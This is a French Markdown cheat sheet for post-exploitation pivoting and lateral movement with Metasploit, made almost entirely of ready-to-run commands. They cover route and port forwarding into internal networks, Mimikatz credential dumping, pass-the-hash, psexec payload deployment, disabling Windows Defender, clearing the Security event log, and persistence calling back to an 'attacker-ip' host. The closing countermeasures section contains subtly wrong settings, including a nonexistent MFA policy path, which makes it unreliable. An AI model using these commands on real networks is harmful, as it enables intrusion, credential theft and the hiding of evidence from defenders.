## Pivoting et Lateral Movement avec Metasploit

Le pivoting avec **Meterpreter** permet d'exploiter une machine compromise comme passerelle pour attaquer des systèmes dans un réseau interne non accessibles directement.

```mermaid
flowchart LR
    A[Attaquant] -->|Session Meterpreter| B(Pivot)
    B -->|Autoroute / SOCKS| C[Réseau Interne]
    C -->|Lateral Movement| D[Cible Finale]
```

> [!note]
> Ce document complète les concepts abordés dans **Pivoting and Tunneling**, **Active Directory Lateral Movement**, **Metasploit Framework Basics** et **Post-Exploitation Fundamentals**.

## Ajout de routes (Autoroute)

> [!warning]
> L'utilisation de **autoroute** ne permet que le trafic via **Metasploit**, contrairement au proxy SOCKS qui permet l'usage d'outils externes.

Vérification de l'adresse IP de la machine compromise :
```bash
ifconfig
```

Ajout d'une route vers le réseau interne cible :
```bash
run autoroute -s 192.168.1.0/24
```

Vérification des routes ajoutées :
```bash
run autoroute -p
```

Identification des réseaux accessibles :
```bash
netstat -rn
```

## Gestion des sessions Meterpreter (background/sessions -i)

Pour basculer entre les sessions actives sans perdre la connexion :

Mettre la session actuelle en arrière-plan :
```bash
background
```

Lister les sessions actives :
```bash
sessions -l
```

Interagir avec une session spécifique :
```bash
sessions -i 1
```

## Double Pivoting (Chainage de pivots)

Le double pivoting consiste à utiliser une première machine compromise pour en compromettre une seconde, puis à utiliser cette seconde machine comme nouveau pivot.

1. Établir une session sur le Pivot 1.
2. Configurer le routage vers le réseau interne 2 via le Pivot 1.
3. Compromettre le Pivot 2 (via exploit ou credentials).
4. Ajouter une route sur le Pivot 2 vers le réseau cible final :
```bash
# Depuis la session du Pivot 2
run autoroute -s 10.0.2.0/24
```

## Pivoting via SSH (Local/Remote Port Forwarding natif)

Si une session SSH est disponible sur le pivot, il est possible de créer des tunnels sans Metasploit.

Local Port Forwarding (Accéder à un service interne depuis la machine attaquante) :
```bash
ssh -L 8080:127.0.0.1:80 user@pivot-ip
```

Remote Port Forwarding (Exposer un service de l'attaquant vers le réseau interne) :
```bash
ssh -R 8080:127.0.0.1:80 user@pivot-ip
```

Dynamic Port Forwarding (SOCKS Proxy via SSH) :
```bash
ssh -D 1080 user@pivot-ip
```

## Scan réseau interne

> [!tip]
> Assurez-vous que la session **Meterpreter** est stable avant de lancer des scans intensifs.

Scan d'un réseau interne avec **Metasploit** :
```bash
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set SESSION 1
run
```

Scan des ports ouverts sur une machine cible :
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-65535
set SESSION 1
run
```

Lister les machines connectées sur le réseau :
```bash
run post/windows/gather/arp_scanner
```

## Port Forwarding

> [!warning]
> Le port forwarding via **portfwd** est instable sur des connexions réseau de faible qualité.

Redirection d'un port local vers un service RDP (3389) d'une machine interne :
```bash
portfwd add -l 4444 -p 3389 -r 192.168.1.10
```

Connexion au bureau à distance :
```bash
rdesktop 127.0.0.1:4444
```

Forwarding d'un port SMB :
```bash
portfwd add -l 445 -p 445 -r 192.168.1.10
```

Vérification des ports forwardés :
```bash
portfwd list
```

Suppression d'un port forward :
```bash
portfwd delete -l 4444 -p 3389 -r 192.168.1.10
```

## Proxy SOCKS

Création d'un proxy SOCKS avec **Metasploit** :
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

Configuration de **/etc/proxychains.conf** :
```text
strict_chain
proxy_dns
socks5 127.0.0.1 1080
```

Scan d'un réseau via **proxychains** :
```bash
proxychains nmap -sT -Pn -n -v 192.168.1.0/24
```

Accès à un service distant via **proxychains** :
```bash
proxychains rdesktop 192.168.1.10
```

## Reverse Socks

Démarrage d'un serveur SOCKS sur l'attaquant :
```bash
ssh -D 1080 -N user@attacker-ip
```

Ouverture d'un tunnel vers l'attaquant avec **Meterpreter** :
```bash
run post/multi/manage/reverse_tcp_proxy SRVHOST=attacker-ip SRVPORT=4444
```

Utilisation de **proxychains** pour scanner derrière le pivot :
```bash
proxychains nmap -sT -Pn -n -v 192.168.1.0/24
```

## Techniques de Living-off-the-land (LotL) pour le mouvement latéral sans Metasploit

Utilisation des outils natifs Windows pour éviter les payloads sur disque :

Utilisation de **WinRM** (PowerShell Remoting) :
```powershell
Enter-PSSession -ComputerName Target-PC -Credential (Get-Credential)
```

Utilisation de **WMI** pour exécuter des commandes à distance :
```bash
wmic /node:Target-IP /user:DOMAIN\User /password:Pass process call create "cmd.exe /c calc.exe"
```

Utilisation de **SMB** pour copier et exécuter (via Admin$ share) :
```bash
copy payload.exe \\Target-IP\ADMIN$
sc \\Target-IP create ServiceName binpath= "C:\Windows\admin$\payload.exe"
sc \\Target-IP start ServiceName
```

## Exploitation et Lateral Movement

> [!danger]
> L'exécution de **kiwi** (**Mimikatz**) est hautement détectable par les EDR modernes.

Utilisation de **Pass-the-Hash** pour se déplacer latéralement :
```bash
load kiwi
kiwi_cmd sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:HASH /run:cmd.exe
```

Récupération des credentials **NTLM** pour **Pass-the-Hash** :
```bash
load kiwi
kiwi_cmd sekurlsa::logonpasswords
```

Exploitation SMB pour se déplacer latéralement :
```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser Administrator
set SMBPass HASH
exploit
```

Déploiement de **Meterpreter** sur une autre machine via **PSExec** :
```bash
psexec -U Administrator -P Password -h -c meterpreter.exe 192.168.1.10
```

## Évitement de détection et persistance

Désactivation de **Windows Defender** :
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Création d'une persistance via un Scheduled Task :
```bash
run persistence -X -i 60 -p 4444 -r attacker-ip
```

Suppression des logs Windows :
```cmd
wevtutil cl Security
```

Nettoyage des routes et tunnels :
```bash
portfwd flush
run autoroute -d 192.168.1.0/24
```

## Contre-mesures

Blocage de l'ajout de routes suspectes :
```powershell
Set-NetFirewallRule -DisplayName "Block Meterpreter" -Direction Outbound -Action Block
```

Détection des connexions SOCKS suspectes :
```text
index=windows EventCode=5156 "Metasploit"
```

Désactivation de **SMBv1** :
```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false
```

Forçage de l'authentification **MFA** pour SMB et RDP :
```cmd
gpedit.msc
```
*(Chemin : Computer Configuration > Windows Settings > Security Settings > Account Policies > MFA)*